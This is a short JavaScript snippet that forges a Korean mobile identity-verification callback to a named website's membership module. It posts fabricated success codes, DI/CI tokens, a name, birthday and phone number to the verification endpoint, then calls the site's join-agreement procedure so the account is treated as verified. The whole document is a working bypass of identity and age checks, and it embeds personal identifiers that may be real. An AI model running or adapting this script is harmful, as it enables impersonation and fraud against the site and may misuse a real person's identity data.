const myHeaders = new Headers()
const di = 'RC0GCrqGSIb3DQIJAyEeAog3oNcUrbffefVwffv4tprewrwforfwerwGffrfff4ddfACEevbm2ftVEb%2Bz12urgEUaHnw%3D'
const ci = 'uUg1zd0md0Tl34xIQFftdvrCDLrlfGearvfXHrewVGf6ffhrewrfwruf3ffffzsKSJgfKcuR7WCWpPNJH6PD1qCZBnmz5ZWmGYwC8QzBblv%2F%2F%2FTA%3D%3D'
const name = '%C8%A3%C1%BE%B1%D4'
const birthday = '19940302'
const cel = '01024423144423'
const sex = '1'

myHeaders.append("Content-Type", "application/x-www-form-urlencoded");
const urlencoded = new URLSearchParams();
urlencoded.append("idcf_mbr_com_cd", "P21050000000");
urlencoded.append("hs_cert_svc_tx_seqno", "20230926221017");
urlencoded.append("hs_cert_msr_cd", "10");
urlencoded.append("hs_cert_rqst_caus_cd", "");
urlencoded.append("result_cd", "B000");
urlencoded.append("result_msg", "%BA%BB%C0%CE%C0%CE%C1%F5+%BF%CF%B7%E1");
urlencoded.append("result_di", di);
urlencoded.append("result_ci", ci);
urlencoded.append("result_name", name);
urlencoded.append("result_birthday", birthday);
urlencoded.append("result_sex", sex);
urlencoded.append("result_foreign", "1");
urlencoded.append("result_cellcompany", "03");
urlencoded.append("result_cel", cel);

var requestOptions = {
    method: 'POST',
    headers: myHeaders,
    body: urlencoded,
    redirect: 'follow'
};

fetch("https://aragonk.com/xe/modules/join_extend/skins/default_okname/safe_hs_cert4.php", requestOptions)
    .then(response => {
        response.text()
        var param = {
            name: name,
            di: di,
            birthday: birthday,
            age: 29,
            sex: sex,
            cellcompany: 3,
            cell: cel,
            type: 'self'
        }
        exec_xml('join_extend', 'procJoin_extendAgree', param, function() {
            location.reload()
        });

    })
    .catch(error => console.log('error', error));


